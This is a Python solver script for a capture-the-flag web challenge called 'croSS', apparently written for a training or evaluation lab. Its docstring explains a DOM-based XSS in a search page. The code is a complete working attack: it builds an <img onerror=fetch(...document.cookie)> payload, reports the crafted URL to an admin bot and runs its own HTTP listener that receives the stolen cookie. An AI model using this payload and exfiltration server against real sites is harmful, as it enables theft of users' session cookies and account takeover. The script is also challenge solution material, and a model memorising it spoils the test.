"""
Solver for croSS.

Vulnerability: the search page (`views/index.html`, served by `web-cross-app`)
reads the `query` URL parameter on the client and injects it, completely
unsanitized, straight into `#results.innerHTML`:

    const query = params.get('query');
    if (query) {
        document.getElementById('results').innerHTML = `<p>Result for:</p> ${query}`;
    }

This is a classic reflected DOM-based XSS: whatever HTML we put in `?query=`
gets rendered verbatim. The page also offers a "Report This URL" button that
POSTs the current URL to `/report` on `web-cross-app`, which forwards it to
the admin bot (`web-cross-bot`, only reachable from inside the cluster). The
bot stamps a cookie containing the flag before visiting whatever URL it was
told to (see `bot/bot.js`), so if we get it to open our crafted search-page
URL, our injected markup executes in a context where `document.cookie`
contains the flag.

We exploit this with the documented technique from the challenge README
(`<img src=x onerror=fetch(...)>`, since `innerHTML` never executes injected
`<script>` tags but does run `onerror` handlers on injected `<img>` tags),
adapted to exfiltrate to a tiny HTTP server we run ourselves instead of an
external webhook:

    1. Figure out our own IP as seen by the cluster network (the same
       technique used by the already-working spy-me-level2 solver: open a UDP
       socket toward the target and read back the local address picked for
       that route).
    2. Start a listener that will receive the exfiltrated cookie.
    3. Report `http://web-cross-app:1213/?query=<payload>` to the admin bot
       via `POST /report` on the *externally reachable* `web-cross-app`
       endpoint. The bot itself resolves `web-cross-app` through in-cluster
       DNS, exactly like `routes.js` resolves `web-cross-bot`.
    4. Wait for the bot's browser to hit our listener with the stolen cookie
       and pull the flag out of it.
"""

import os
import socket
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

LISTENER_PORT = 8080
APP_INTERNAL_HOST = "web-cross-app"
APP_INTERNAL_PORT = 1213


def own_reachable_ip(target_host: str, target_port: int) -> str:
    """The IP by which `target_host` (and, symmetrically, our own listener) is reachable."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, target_port))
        return s.getsockname()[0]
    finally:
        s.close()


class Listener:
    """Receives the exfiltrated `document.cookie` value from the admin bot's browser."""

    def __init__(self):
        self.cookie = None
        self.received = threading.Event()
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                print(f"[listener] {self.address_string()} - {fmt % args}", file=sys.stderr)

            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == "/exfil":
                    qs = urllib.parse.parse_qs(parsed.query)
                    cookie = qs.get("c", [""])[0]
                    print(f"[listener] exfil received: {cookie!r}")
                    owner.cookie = cookie
                    owner.received.set()
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        self.server = ThreadingHTTPServer(("0.0.0.0", LISTENER_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def wait_for_exfil(self, timeout: float) -> str:
        if not self.received.wait(timeout):
            raise TimeoutError("did not receive the exfiltrated cookie in time")
        return self.cookie

    def stop(self):
        self.server.shutdown()


def build_payload(listener_url: str) -> str:
    # The documented technique from README.md: innerHTML never runs injected
    # <script> tags, but it does run onerror handlers on injected <img> tags.
    return (
        f'<img src=x onerror="fetch(\'{listener_url}/exfil?c=\''
        "+encodeURIComponent(document.cookie))\">"
    )


def exploit(app_endpoint: str):
    app_host, app_port = app_endpoint.replace("http://", "").replace("https://", "").split(":")
    my_ip = own_reachable_ip(app_host, int(app_port))
    print(f"[*] Our listener is reachable at {my_ip}:{LISTENER_PORT}")

    listener = Listener()
    listener.start()

    listener_url = f"http://{my_ip}:{LISTENER_PORT}"
    payload = build_payload(listener_url)
    query = urllib.parse.quote(payload, safe="")
    # The admin bot resolves plain service names through in-cluster DNS, just
    # like web-cross-app itself does when it reports to web-cross-bot.
    exploit_url = f"http://{APP_INTERNAL_HOST}:{APP_INTERNAL_PORT}/?query={query}"
    print(f"[*] Crafted exploit URL: {exploit_url}")

    r = requests.post(f"{app_endpoint}/report", json={"url": exploit_url}, timeout=15)
    assert r.ok, f"reporting the URL failed: {r.status_code} {r.text}"
    print(f"[*] Reported URL to the admin bot: {r.text.strip()}")

    cookie = listener.wait_for_exfil(timeout=60)
    listener.stop()

    assert "flag=" in cookie, f"exfiltrated cookie did not contain the flag cookie: {cookie!r}"
    flag = cookie.split("flag=", 1)[1]
    print(f"[*] Flag: {flag}")


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SERVICE_WEB_CROSS_APP_HTTP_ENDPOINT")
    assert endpoint, "usage: solve.py <web-cross-app base url>"
    exploit(endpoint)
